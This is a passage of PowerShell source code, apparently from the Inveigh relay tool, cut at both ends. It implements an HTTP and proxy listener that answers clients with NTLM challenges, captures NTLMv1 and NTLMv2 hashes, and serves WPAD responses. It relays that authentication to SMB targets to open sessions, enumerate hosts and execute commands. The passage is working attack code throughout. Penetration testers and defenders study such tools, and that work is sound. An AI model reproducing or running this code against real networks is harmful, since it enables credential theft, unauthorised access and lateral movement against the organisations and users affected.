            $HTTP_raw_URL = $HTTP_raw_URL.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $HTTP_request_raw_URL = New-Object System.String ($HTTP_raw_URL,0,$HTTP_raw_URL.Length)
            $HTTP_source_IP = $HTTP_client.Client.RemoteEndpoint.Address.IPAddressToString
            $HTTP_source_Port = $HTTP_client.Client.RemoteEndpoint.Port
            $HTTP_connection_header_close = $true

            if(($TCP_request).StartsWith("47-45-54-20"))
            {
                $HTTP_method = "GET"
            }
            elseif(($TCP_request).StartsWith("48-45-41-44-20"))
            {
                $HTTP_method = "HEAD"
            }
            elseif(($TCP_request).StartsWith("4f-50-54-49-4F-4E-53-20"))
            {
                $HTTP_method = "OPTIONS"
            }
            elseif(($TCP_request).StartsWith("43-4F-4E-4E-45-43-54"))
            {
                $HTTP_method = "CONNECT"
            }

            if($TCP_request -like "*-48-6F-73-74-3A-20-*")
            {
                $HTTP_header_host_extract = $TCP_request.Substring($TCP_request.IndexOf("-48-6F-73-74-3A-20-") + 19)
                $HTTP_header_host_extract = $HTTP_header_host_extract.Substring(0,$HTTP_header_host_extract.IndexOf("-0D-0A-"))
                $HTTP_header_host_extract = $HTTP_header_host_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_host = New-Object System.String ($HTTP_header_host_extract,0,$HTTP_header_host_extract.Length)
            }

            if($TCP_request -like "*-55-73-65-72-2D-41-67-65-6E-74-3A-20-*")
            {
                $HTTP_header_user_agent_extract = $TCP_request.Substring($TCP_request.IndexOf("-55-73-65-72-2D-41-67-65-6E-74-3A-20-") + 37)
                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Substring(0,$HTTP_header_user_agent_extract.IndexOf("-0D-0A-"))
                $HTTP_header_user_agent_extract = $HTTP_header_user_agent_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_user_agent = New-Object System.String ($HTTP_header_user_agent_extract,0,$HTTP_header_user_agent_extract.Length)
            }

            if($HTTP_request_raw_URL_old -ne $HTTP_request_raw_URL -or $HTTP_client_handle_old -ne $HTTP_client.Client.Handle)
            {
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $HTTP_method request for $HTTP_request_raw_URL received from $HTTP_source_IP") > $null
                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) host header $HTTP_header_host received from $HTTP_source_IP") > $null

                if($HTTP_header_user_agent)
                {
                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) user agent received from $HTTP_source_IP`:`n$HTTP_header_user_agent") > $null
                }

                if($Proxy -eq 'Y' -and $ProxyIgnore.Count -gt 0 -and ($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_}))
                {
                    $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] - $HTTP_type($HTTPPort) ignoring wpad.dat request due to user agent from $HTTP_source_IP") > $null
                }

            }

            if($TCP_request -like "*-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-*")
            {
                $HTTP_header_authorization_extract = $TCP_request.Substring($TCP_request.IndexOf("-41-75-74-68-6F-72-69-7A-61-74-69-6F-6E-3A-20-") + 46)
                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Substring(0,$HTTP_header_authorization_extract.IndexOf("-0D-0A-"))
                $HTTP_header_authorization_extract = $HTTP_header_authorization_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                $HTTP_header_authorization = New-Object System.String ($HTTP_header_authorization_extract,0,$HTTP_header_authorization_extract.Length)
            }

            if(($HTTP_request_raw_URL -notmatch '/wpad.dat' -and $HTTPAuth -eq 'Anonymous') -or ($HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -eq 'Anonymous') -or (
            $HTTP_request_raw_URL -match '/wpad.dat' -and $WPADAuth -like 'NTLM*' -and $WPADAuthIgnore.Count -gt 0 -and ($WPADAuthIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
            {
                $HTTP_response_status_code = 0x32,0x30,0x30
                $HTTP_response_phrase = 0x4f,0x4b
                $HTTP_client_close = $true
            }
            else
            {
                
                if($proxy_listener)
                {
                    $HTTP_response_status_code = 0x34,0x30,0x37
                    $HTTP_header_authenticate = 0x50,0x72,0x6f,0x78,0x79,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }
                else
                {
                    $HTTP_response_status_code = 0x34,0x30,0x31
                    $HTTP_header_authenticate = 0x57,0x57,0x57,0x2d,0x41,0x75,0x74,0x68,0x65,0x6e,0x74,0x69,0x63,0x61,0x74,0x65,0x3a,0x20
                }

                $HTTP_response_phrase = 0x55,0x6e,0x61,0x75,0x74,0x68,0x6f,0x72,0x69,0x7a,0x65,0x64
            }
        
            if($HTTP_header_authorization.StartsWith('NTLM '))
            {
                $HTTP_header_authorization = $HTTP_header_authorization -replace 'NTLM ',''
                [Byte[]]$HTTP_request_bytes = [System.Convert]::FromBase64String($HTTP_header_authorization)
                $HTTP_connection_header_close = $false
            
                if([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '01-00-00-00')
                {
                    
                    if($inveigh.SMB_relay -and $relay_step -eq 0)
                    {
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_type($HTTPPort) to SMB relay initiated by $HTTP_source_IP") > $null
                        $SMB_connect = Invoke-SMBConnect $process_ID_bytes $HTTP_source_IP
                        $target = $SMB_connect[1]
                        $SMB_client = $SMB_connect[0]
                    
                        if(!$target)
                        {
                            $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Eligible target not found") > $null
                            $relay_step = 0
                        }
                        elseif(!$SMB_client.connected)
                        {

                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                            {
                
                                if($inveigh.enumerate[$i].IP -eq $target -and !$inveigh.enumerate[$i]."Signing")
                                {
                                    $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Relay target $target is not responding") > $null
                                    break
                                }
                
                            }
                            
                            $relay_step = 0
                        }
                        else
                        {
                            $relay_step = 1
                        }

                        if($relay_step -eq 1)
                        {
                            $SMB_relay_bytes = Invoke-SMBRelayChallenge $SMB_client $HTTP_request_bytes $SMB_version $process_ID_bytes

                            if($SMB_relay_bytes.Length -le 3)
                            {
                                $relay_step = 0
                                $HTTP_client_close = $true
                                $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                            }

                        }

                        if($relay_step -eq 1)
                        {
                            $SMB_user_ID = $SMB_relay_bytes[34..33]
                            $SMB_relay_NTLMSSP = [System.BitConverter]::ToString($SMB_relay_bytes)
                            $SMB_relay_NTLMSSP = $SMB_relay_NTLMSSP -replace "-",""
                            $SMB_relay_NTLMSSP_index = $SMB_relay_NTLMSSP.IndexOf("4E544C4D53535000")
                            $SMB_relay_NTLMSSP_bytes_index = $SMB_relay_NTLMSSP_index / 2
                            $SMB_domain_length = Get-UInt16DataLength ($SMB_relay_NTLMSSP_bytes_index + 12) $SMB_relay_bytes
                            $SMB_domain_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 12)..($SMB_relay_NTLMSSP_bytes_index + 19)]
                            $SMB_target_length = Get-UInt16DataLength ($SMB_relay_NTLMSSP_bytes_index + 40) $SMB_relay_bytes
                            $SMB_target_length_offset_bytes = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 40)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length)]
                            $SMB_relay_target_flag = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 22)]
                            $SMB_relay_NTLM_challenge = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 24)..($SMB_relay_NTLMSSP_bytes_index + 31)]
                            $SMB_relay_target_details = $SMB_relay_bytes[($SMB_relay_NTLMSSP_bytes_index + 56 + $SMB_domain_length)..($SMB_relay_NTLMSSP_bytes_index + 55 + $SMB_domain_length + $SMB_target_length)]
                            $session_ID = $SMB_relay_bytes[44..51]
                    
                            $HTTP_NTLM_bytes = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00 +
                                               $SMB_domain_length_offset_bytes +
                                               0x05,0x82 +
                                               $SMB_relay_target_flag +
                                               0xa2 +
                                               $SMB_relay_NTLM_challenge +
                                               0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                               $SMB_target_length_offset_bytes +
                                               $SMB_relay_target_details
                    
                            $NTLM_challenge_base64 = [System.Convert]::ToBase64String($HTTP_NTLM_bytes)
                            $NTLM = 'NTLM ' + $NTLM_challenge_base64
                            $NTLM_challenge = Get-SMBNTLMChallenge $SMB_relay_bytes

                            if(!$inveigh.HTTP_session_table.ContainsKey("$ClientIPAddress`:$ClientPort"))
                            {
                                $inveigh.HTTP_session_table.Add("$ClientIPAddress`:$ClientPort",$HTTP_challenge)
                            }
                            else
                            {
                                $inveigh.HTTP_session_table["$ClientIPAddress`:$ClientPort"] = $HTTP_challenge
                            }

                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Received challenge $NTLM_challenge for relay from $Target") > $null
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Providing challenge $NTLM_challenge for relay to $HTTP_source_IP") > $null
                            $relay_step = 2
                        }
                        else
                        {
                            $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                        }

                    }
                    else
                    {
                        $NTLM = Get-NTLMChallengeBase64 $Challenge $HTTP_source_IP $HTTP_client.Client.RemoteEndpoint.Port
                    }

                }
                elseif([System.BitConverter]::ToString($HTTP_request_bytes[8..11]) -eq '03-00-00-00')
                {
                    $HTTP_NTLM_length = Get-UInt16DataLength 20 $HTTP_request_bytes
                    $HTTP_NTLM_offset = Get-UInt32DataLength 24 $HTTP_request_bytes
                    $HTTP_NTLM_domain_length = Get-UInt16DataLength 28 $HTTP_request_bytes
                    $HTTP_NTLM_domain_offset = Get-UInt32DataLength 32 $HTTP_request_bytes
                    $NTLM_challenge = $inveigh.HTTP_session_table.$Session
                       
                    if($HTTP_NTLM_domain_length -eq 0)
                    {
                        $HTTP_NTLM_domain_string = $null
                    }
                    else
                    {  
                        $HTTP_NTLM_domain_string = Convert-DataToString $HTTP_NTLM_domain_offset $HTTP_NTLM_domain_length $HTTP_request_bytes
                    } 
                    
                    $HTTP_NTLM_user_length = Get-UInt16DataLength 36 $HTTP_request_bytes
                    $HTTP_NTLM_user_offset = Get-UInt32DataLength 40 $HTTP_request_bytes
                    
                    if($HTTP_NTLM_user_length -eq 0)
                    {    
                        $HTTP_NTLM_user_string = $null
                    }
                    else
                    {
                        $HTTP_NTLM_user_string = Convert-DataToString $HTTP_NTLM_user_offset $HTTP_NTLM_user_length $HTTP_request_bytes
                    }

                    $HTTP_username_full = $HTTP_NTLM_domain_string + "\" + $HTTP_NTLM_user_string
                    $HTTP_NTLM_host_length = Get-UInt16DataLength 44 $HTTP_request_bytes
                    $HTTP_NTLM_host_offset = Get-UInt32DataLength 48 $HTTP_request_bytes
                    $HTTP_NTLM_host_string = Convert-DataToString $HTTP_NTLM_host_offset $HTTP_NTLM_host_length $HTTP_request_bytes

                    if($HTTP_NTLM_length -eq 24) # NTLMv1
                    {
                        $NTLM_type = "NTLMv1"
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[($HTTP_NTLM_offset - 24)..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(48,':')
                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_response + ":" + $NTLM_challenge

                        if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {     
                            $inveigh.NTLMv1_list.Add($HTTP_NTLM_hash) > $null
                        
                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:") > $null
                                $inveigh.output_queue.Add($HTTP_NTLM_hash) > $null
                            }
                            else
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:`n[not unique]") > $null
                            }

                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                            {
                                $inveigh.NTLMv1_file_queue.Add($HTTP_NTLM_hash) > $null
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) $NTLM_type written to " + "Inveigh-NTLMv1.txt") > $null
                            }

                            if($inveigh.NTLMv1_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                            {
                                $inveigh.NTLMv1_username_list.Add("$HTTP_source_IP $HTTP_username_full") > $null
                            }

                        }

                    }
                    else # NTLMv2
                    {   
                        $NTLM_type = "NTLMv2"           
                        $NTLM_response = [System.BitConverter]::ToString($HTTP_request_bytes[$HTTP_NTLM_offset..($HTTP_NTLM_offset + $HTTP_NTLM_length)]) -replace "-",""
                        $NTLM_response = $NTLM_response.Insert(32,':')
                        $HTTP_NTLM_hash = $HTTP_NTLM_user_string + "::" + $HTTP_NTLM_domain_string + ":" + $NTLM_challenge + ":" + $NTLM_response
                        
                        if($NTLM_challenge -and $NTLM_response -and ($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$'))))
                        {
                            $inveigh.NTLMv2_list.Add($HTTP_NTLM_hash) > $null
                        
                            if(!$inveigh.console_unique -or ($inveigh.console_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full"))
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:") > $null
                                $inveigh.output_queue.Add($HTTP_NTLM_hash) > $null
                            }
                            else
                            {
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 captured for $HTTP_username_full from $HTTP_source_IP($NTLM_host_string)`:$HTTP_source_Port`:`n[not unique]") > $null
                            }

                            if($inveigh.file_output -and (!$inveigh.file_unique -or ($inveigh.file_unique -and $inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")))
                            {
                                $inveigh.NTLMv2_file_queue.Add($HTTP_NTLM_hash) > $null
                                $inveigh.output_queue.Add("[+] [$(Get-Date -format s)] $HTTP_type($HTTPPort) NTLMv2 written to " + "Inveigh-NTLMv2.txt") > $null
                            }

                            if($inveigh.NTLMv2_username_list -notcontains "$HTTP_source_IP $HTTP_username_full")
                            {
                                $inveigh.NTLMv2_username_list.Add("$HTTP_source_IP $HTTP_username_full") > $null
                            }
                        
                        }

                    }
                    
                    if($HTTP_NTLM_domain_string -and $HTTP_NTLM_user_string -and $HTTP_NTLM_host_string -and $HTTP_source_IP)
                    {
                        Invoke-SessionUpdate $HTTP_NTLM_domain_string $HTTP_NTLM_user_string $HTTP_NTLM_host_string $HTTP_source_IP
                    }

                    $HTTP_response_status_code = 0x32,0x30,0x30
                    $HTTP_response_phrase = 0x4f,0x4b
                    $HTTP_client_close = $true
                    $NTLM_challenge = $null
                    
                    if($inveigh.SMB_relay -and $relay_step -eq 2)
                    {

                        if(!$Username -or $Username -contains $HTTP_NTLM_user_string -or $Username -contains $HTTP_username_full)
                        {

                            if($inveigh.machine_accounts -or (!$inveigh.machine_accounts -and -not $HTTP_NTLM_user_string.EndsWith('$')))
                            {

                                if($inveigh.relay_failed_login_table.$HTTP_username_full.Count -le $FailedLoginThreshold)
                                {

                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Sending $NTLM_type response for $HTTP_username_full for relay to $Target") > $null
                                    $SMB_relay_failed = Invoke-SMBRelayResponse $SMB_client $HTTP_request_bytes $SMB_version $SMB_user_ID $session_ID $process_ID_bytes
                                    
                                    if(!$SMB_relay_failed)
                                    {
                                        $inveigh.session_current = $inveigh.session_count
                                        $inveigh.session_message_ID_table.Add($inveigh.session_count,3)

                                        if($Attack -contains 'Session')
                                        {
                                            
                                            if($SMB_client.Connected)
                                            {
                                                $inveigh.session_socket_table[$inveigh.session_count] = $SMB_client
                                                $inveigh.session_table[$inveigh.session_count] = $session_ID
                                                $inveigh.session_lock_table[$inveigh.session_count] = 'open'
                                                $session_privilege = Invoke-SMBRelayExecute $SMB_client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $true
                                                $session_object = New-Object PSObject
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Session $inveigh.session_count
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Target $SMB_client.Client.RemoteEndpoint.Address.IPaddressToString
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name Initiator $HTTP_source_IP
                                                Add-Member -InputObject $session_object -MemberType NoteProperty -Name User $HTTP_username_full
                                                
                                                if($session_privilege)
                                                {
                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged "yes"
                                                }
                                                else
                                                {
                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Privileged "no"
                                                }

                                                if($SMB_client.Connected)
                                                {
                                                    $status = "connected"
                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name Status $status
                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Established" $(Get-Date -format s)
                                                    Add-Member -InputObject $session_object -MemberType NoteProperty -Name "Last Activity" $(Get-Date -format s)
                                                    $inveigh.session += $session_object
                                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Session $($inveigh.session_count) added to session list") > $null
                                                }

                                            }

                                        }

                                        if($Attack -contains 'Enumerate' -or $Attack -contains 'Execute')
                                        {

                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                                            {

                                                if($inveigh.enumerate[$i].IP -eq $target)
                                                {
                                                    $target_index = $i
                                                    break
                                                }

                                            }

                                            $filter_date = Get-Date
                                        }

                                        if(($attack -contains 'Enumerate' -and $SMB_client.Connected) -and
                                        (!$inveigh.enumerate[$target_index].Enumerate -or
                                        (New-TimeSpan $inveigh.enumerate[$target_index].Enumerate $filter_date).Minutes -gt $RepeatEnumerate))
                                        {
                                            Invoke-SMBRelayEnum $SMB_client $SMB_user_ID $session_ID $process_ID_bytes $Enumerate $EnumerateGroup
                                        }

                                        if((($session_privilege -and $Attack -contains 'Execute' -and $Attack -contains 'Session' -and $SMB_client.Connected) -or
                                        ($Attack -contains 'Execute' -and $Attack -notcontains 'Session' -and $SMB_client.Connected)) -and
                                        (!$inveigh.enumerate[$target_index].Execute -or (New-TimeSpan $inveigh.enumerate[$target_index].Execute $filter_date).Minutes -gt $RepeatExecute))
                                        {
                                            Invoke-SMBRelayExecute $SMB_client $SMB_version $SMB_user_ID $session_ID $process_ID_bytes $false
                                            $inveigh.enumerate[$target_index].Execute = $(Get-Date -format s)
                                        }

                                        if(!$SMB_client.Connected)
                                        {
                                            $inveigh.session[$inveigh.session_count] | Where-Object {$_.Status = "disconnected"}
                                        }

                                        $inveigh.session_count++
                                    }

                                    if($Attack -notcontains 'Session' -and !$SMB_relay_failed -and $RelayAutoDisable -eq 'Y')
                                    {

                                        if($Attack -contains 'Enumerate')
                                        {

                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                                            {

                                                if($inveigh.enumerate[$i].Enumerate)
                                                {
                                                    $targets_enumerate_complete = @($inveigh.enumerate[$i].IP)
                                                }

                                            }

                                            if($inveigh.target_list -and $targets_enumerated)
                                            {
                                                $targets_enumerate_remaining = Compare-Object -ReferenceObject $inveigh.target_list -DifferenceObject $targets_enumerate_complete -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                                            }

                                        }

                                        if($Attack -contains 'Execute')
                                        {

                                            for($i = 0;$i -lt $inveigh.enumerate.Count;$i++)
                                            {

                                                if($inveigh.enumerate[$i].Execute)
                                                {
                                                    $targets_execute_complete = @($inveigh.execute[$i].IP)
                                                }

                                            }

                                            if($inveigh.target_list -and $targets_enumerated)
                                            {
                                                $targets_execute_remaining = Compare-Object -ReferenceObject $inveigh.target_list -DifferenceObject $targets_execute_complete -PassThru | Where-Object {$_.SideIndicator -eq "<="}
                                            }

                                        }

                                        if($Attack -notcontains 'Session' -or (!$targets_enumerate_remaining -and $Attack -contains 'Enumerate' -and $Attack -notcontains 'Execute') -or
                                        (!$targets_execute_remaining -and $Attack -contains 'Execute' -and $Attack -notcontains 'Enumerate') -or
                                        (!$targets_enumerate_remaining -and !$targets_execute_remaining -and $Attack -contains 'Enumerate' -and $Attack -contains 'Execute'))
                                        {
                                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay auto disabled due to success") > $null
                                            $inveigh.SMB_relay = $false
                                        }

                                    }

                                    $relay_step = 0

                                }
                                else
                                {
                                    $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_username_full has exceeded failed login limit") > $null
                                    $SMB_client.Close()
                                    $relay_step = 0
                                }

                            }
                            else
                            {
                                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] Relay stopped since $HTTP_NTLM_user_string appears to be a machine account") > $null
                                $SMB_client.Close()
                                $relay_step = 0
                            }

                        }
                        else
                        {
                            $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $HTTP_username_full not on relay username list") > $null
                            $SMB_client.Close()
                            $relay_step = 0
                        }

                    }

                    if($proxy_listener)
                    {
                        $HTTP_send = $false
                    }

                }
        
            }

            if(!$proxy_listener -and $WPADResponse -and $HTTP_request_raw_URL -match '/wpad.dat' -and (!$ProxyIgnore -or !($ProxyIgnore | Where-Object {$HTTP_header_user_agent -match $_})))
            {
                $HTTP_message = $WPADResponse
                $HTTP_header_content_type = [System.Text.Encoding]::UTF8.GetBytes("Content-Type: application/x-ns-proxy-autoconfig")
            }

            $HTTP_timestamp = Get-Date -format r
            $HTTP_timestamp = [System.Text.Encoding]::UTF8.GetBytes($HTTP_timestamp)
            $HTTP_message_bytes = [System.Text.Encoding]::UTF8.GetBytes($HTTP_message)

            if($HTTP_request_raw_URL -notmatch '/wpad.dat' -or ($WPADAuth -like 'NTLM*' -and $HTTP_request_raw_URL -match '/wpad.dat') -and !$HTTP_client_close)
            { 
                $HTTP_header_authenticate_data = [System.Text.Encoding]::UTF8.GetBytes($NTLM)
            }
            
            $packet_HTTPResponse = New-Object System.Collections.Specialized.OrderedDictionary
            $packet_HTTPResponse.Add("HTTPResponse_ResponseVersion",[Byte[]](0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31,0x20))
            $packet_HTTPResponse.Add("HTTPResponse_StatusCode",$HTTP_response_status_code + [Byte[]](0x20))
            $packet_HTTPResponse.Add("HTTPResponse_ResponsePhrase",$HTTP_response_phrase + [Byte[]](0x0d,0x0a))

            if($HTTP_connection_header_close)
            {
                $HTTP_connection_header = [System.Text.Encoding]::UTF8.GetBytes("Connection: close")
                $packet_HTTPResponse.Add("HTTPResponse_Connection",$HTTP_connection_header + [Byte[]](0x0d,0x0a))
            }

            $packet_HTTPResponse.Add("HTTPResponse_Server",[System.Text.Encoding]::UTF8.GetBytes("Server: Microsoft-HTTPAPI/2.0") + [Byte[]](0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_TimeStamp",[Byte[]](0x44,0x61,0x74,0x65,0x3a,0x20) + $HTTP_timestamp + [Byte[]](0x0d,0x0a))
            $packet_HTTPResponse.Add("HTTPResponse_ContentLength",[System.Text.Encoding]::UTF8.GetBytes("Content-Length: $($HTTP_message_bytes.Length)") + [Byte[]](0x0d,0x0a))

            if($HTTP_header_authenticate -and $HTTP_header_authenticate_data)
            {
                $packet_HTTPResponse.Add("HTTPResponse_AuthenticateHeader",$HTTP_header_authenticate + $HTTP_header_authenticate_data + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_header_content_type)
            {
                $packet_HTTPResponse.Add("HTTPResponse_ContentType",$HTTP_header_content_type + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_header_cache_control)
            {
                $packet_HTTPResponse.Add("HTTPResponse_CacheControl",$HTTP_header_cache_control + [Byte[]](0x0d,0x0a))
            }

            if($HTTP_send)
            {
                $packet_HTTPResponse.Add("HTTPResponse_Message",[Byte[]](0x0d,0x0a) + $HTTP_message_bytes)
                $HTTP_response = ConvertFrom-PacketOrderedDictionary $packet_HTTPResponse
                $HTTP_stream.Write($HTTP_response,0,$HTTP_response.Length)
                $HTTP_stream.Flush()
            }

            Start-Sleep -m 10
            $HTTP_request_raw_URL_old = $HTTP_request_raw_URL

            if($HTTP_client_close)
            {

                if($proxy_listener)
                {
                    $HTTP_client.Client.Close()
                }
                else
                {
                    $HTTP_client.Close()
                }

            }

        }
        else
        {

            if($HTTP_client_handle_old -eq $HTTP_client.Client.Handle)
            {
                $HTTP_reset++
            }
            else
            {
                $HTTP_reset = 0
            }

            if($HTTP_connection_header_close -or $HTTP_reset -gt 20)
            {
                $HTTP_client.Close()
                $HTTP_reset = 0
            }
            else
            {
                Start-Sleep -m 100
            }

        }

    }

    $HTTP_client.Close()
    $HTTP_listener.Stop()
}

# Control Relay Loop ScriptBlock
$control_relay_scriptblock = 
{
    param ($ConsoleQueueLimit,$RelayAutoExit,$RunTime)
    
    function Invoke-OutputQueueLoop
    {

        while($inveigh.output_queue.Count -gt 0)
        {
            $inveigh.console_queue.Add($inveigh.output_queue[0]) > $null

            if($inveigh.file_output)
            {

                if ($inveigh.output_queue[0].StartsWith("[+] ") -or $inveigh.output_queue[0].StartsWith("[*] ") -or $inveigh.output_queue[0].StartsWith("[!] ") -or $inveigh.output_queue[0].StartsWith("[-] "))
                {
                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
                }
                else
                {
                    $inveigh.log_file_queue.Add("[redacted]") > $null    
                }

            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

    }

    function Stop-InveighRunspace
    {
        param ([String]$Message)
        
        if($inveigh.HTTPS -and !$inveigh.HTTPS_existing_certificate -or ($inveigh.HTTPS_existing_certificate -and $inveigh.HTTPS_force_certificate_delete))
        {

            try
            {
                $certificate_store = New-Object System.Security.Cryptography.X509Certificates.X509Store("My","LocalMachine")
                $certificate_store.Open('ReadWrite')
                $certificates = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})

                foreach($certificate in $certificates)
                {
                    $certificate_store.Remove($certificate)
                }

                $certificate_store.Close()
            }
            catch
            {
                $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] SSL Certificate Deletion Error [Remove Manually]") > $null
            }

        }

        if($ADIDNSCleanup -eq 'Y' -and $inveigh.ADIDNS_table.Count -gt 0)
        {
            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys

            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
            {
                
                if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)
                {

                    try
                    {
                        Disable-ADIDNSNode -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Partition $ADIDNSPartition -Zone $ADIDNSZone
                        $inveigh.ADIDNS_table.$ADIDNS_host = $null
                    }
                    catch
                    {
                        $error_message = $_.Exception.Message
                        $error_message = $error_message -replace "`n",""
                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for $ADIDNS_host remove failed") > $null
                    }

                }

            }

        }
        
        if($inveigh.relay_running)
        {
            Start-Sleep -m 100

            if($Message)
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting due to $Message") > $null
            }
            else
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh Relay is exiting") > $null  
            }

            if(!$inveigh.running)
            {
                Invoke-OutputQueueLoop
                Start-Sleep -m 100
            }

            $inveigh.relay_running = $false
        }

        if($inveigh.running)
        {

            if($Message)
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting due to $Message") > $null
            }
            else
            {
                $inveigh.output_queue.Add("[*] [$(Get-Date -format s)] Inveigh is exiting") > $null  
            }

            Invoke-OutputQueueLoop

            if(!$elevated_privilege)
            {
                Start-Sleep -s 3
            }

            $inveigh.running = $false
        }

        $inveigh.ADIDNS = $null
        $inveigh.HTTPS = $false
    }

    if($RunTime)
    {    
        $control_timeout = New-TimeSpan -Minutes $RunTime
        $control_stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    }
       
    while($inveigh.relay_running -and !$inveigh.running)
    {

        if($RelayAutoExit -eq 'Y' -and !$inveigh.SMB_relay)
        {
            Start-Sleep -S 5
            Stop-InveighRunspace "disabled relay"
        }

        if($RunTime)
        {

            if($control_stopwatch.Elapsed -ge $control_timeout)
            {
